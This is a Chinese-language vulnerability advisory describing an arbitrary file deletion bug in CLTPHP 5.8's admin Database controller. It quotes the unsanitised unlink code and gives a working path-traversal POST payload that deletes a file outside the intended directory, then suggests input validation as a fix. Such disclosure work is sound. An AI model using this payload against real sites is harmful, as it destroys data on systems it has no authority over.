CLTPHP 5.8 后台任意文件删除漏洞
===============================

一、漏洞简介
------------

CLTPHP是基于ThinkPHP5开发，后台采用Layui框架的内容管理系统，

二、漏洞影响
------------

CLTPHP 5.8及之前版本

三、复现过程
------------

### 漏洞分析

`app/admin/controller/Database.php` 第221-248行：

    public function delSqlFiles() {  
      $batchFlag = input('param.batchFlag', 0, 'intval');  
      //批量删除  
      if ($batchFlag) {  
        $files = input('key', array());  
      }else {  
        $files[] = input('sqlfilename' , '');  
      }  
      if (empty($files)) {  
    \10.     $result['msg'] = '请选择要删除的sql文件!';  
    \11.     $result['code'] = 0;  
    \12.     return $result;  
    \13.   }  
    \14.  
    \15.   foreach ($files as $file) {  
    \16.     $a = unlink($this->datadir.'/' . $file);  
    \17.   }  
    \18.   if($a){  
    \19.     $result['msg'] = '删除成功!';  
    \20.     $result['url'] = url('restore');  
    \21.     $result['code'] = 1;  
    \22.     return $result;  
    \23.   }else{  
    \24.     $result['msg'] = '删除失败!';  
    \25.     $result['code'] = 0;  
    \26.     return $result;  
    \27.   }  
    \28. }  

在这段函数中，参数sqlfilename未经任何处理，直接带入unlink函数中删除，导致程序在实现上存在任意文件删除漏洞，攻击者可通过该漏洞删除任意文件。

### 漏洞复现

构造URL，成功删除根目录的1.txt文件

    http://www.0-sec.org/admin/Database/delSqlFiles.html

     
    POST: sqlfilename=..\\..\\1.txt

![11.png](./.resource/CLTPHP5.8后台任意文件删除漏洞/media/rId26.png)

### 修复建议

> 对于要删除的文件，通过正则判断用户输入的参数的格式，看输入的格式是否合法。
